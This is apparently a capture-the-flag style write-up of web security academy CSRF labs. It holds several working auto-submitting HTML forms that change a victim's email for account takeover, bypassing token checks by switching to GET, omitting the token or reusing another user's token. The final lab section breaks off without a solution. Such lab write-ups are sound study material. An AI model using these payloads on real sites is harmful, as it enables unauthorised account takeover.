# CSRF (Cross-Site Request Forgery)

## Lab: CSRF vulnerability with no defenses


This lab's email change functionality is vulnerable to CSRF.

To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.

You can log in to your own account using the following credentials: wiener:peter

In this CSSRF challenge there are no protection measures on the application therefore the below simple poc is all that is required to takeover the users account:

```
<html>
	<body>
		<form action="https://0afc001e048626f7c04d456200550006.web-security-academy.net/my-account/change-email" method="POST">
			<input type="hidden" name="email" value="takeover@takeover.com" />
		</form>
		<script>
			document.forms[0].submit();
		</script>
	</body>
</html>

```

All we need to do with this poc is store it on the exploit server and then deliver the link to the victim.


## Lab: CSRF where token validation depends on request method

This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter

In this challenge the previous poc won't work because the csrf is validated on post requests however it isn't validated on get requests therefore the only thing we need to do is change the method to GET instead of POST and we are able to change the email successfully. Below is the poc I used:

```

<html>
	<body>
		<form action="https://0a53009f046573b4c29ed0e8006b0013.web-security-academy.net/my-account/change-email" method="GET">
			<input type="hidden" name="email" value="takeover@takeover.com" />
                        <input type="hidden" name="csrf" value="9NmEZRE3tQOCuYEX0TjpnTFa5gduIiLh" />
		</form>
		<script>
			document.forms[0].submit();
		</script>
	</body>
</html>

```


## Lab: CSRF where token validation depends on token being present

This lab's email change functionality is vulnerable to CSRF.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter


```

<html>
	<body>
		<form action="https://0a790025042479e9c263b69d00690049.web-security-academy.net/my-account/change-email" method="POST">
			<input type="hidden" name="email" value="takeover@takeover.com" />
            
		</form>
		<script>
			document.forms[0].submit();
		</script>
	</body>
</html>

```

The above PoC works because sometimes the server will validate the CSRF token if the token is presented however if the token is ommitted completely then the server will not try to validate and allow the request to go through.


## Lab: CSRF where token is not tied to user session

This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

wiener:peter
carlos:montoya

In this challenge because the token is not tied to the users session you can first obtain a user token by making the post request and then adding that token to the poc form.


```
<html>
	<body>
		<form action="https://0a790025042479e9c263b69d00690049.web-security-academy.net/my-account/change-email" method="POST">
			<input type="hidden" name="email" value="takeover@takeover.com" />
			<input type="hidden" name="csrf" value="GKmQMT0YXJwVBxrR1OybzKCM3MBEKtFl" />
            
		</form>
		<script>
			document.forms[0].submit();
		</script>
	</body>
</html>

```

## Lab: CSRF where token is tied to non-session cookie

This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

wiener:peter
carlos:montoya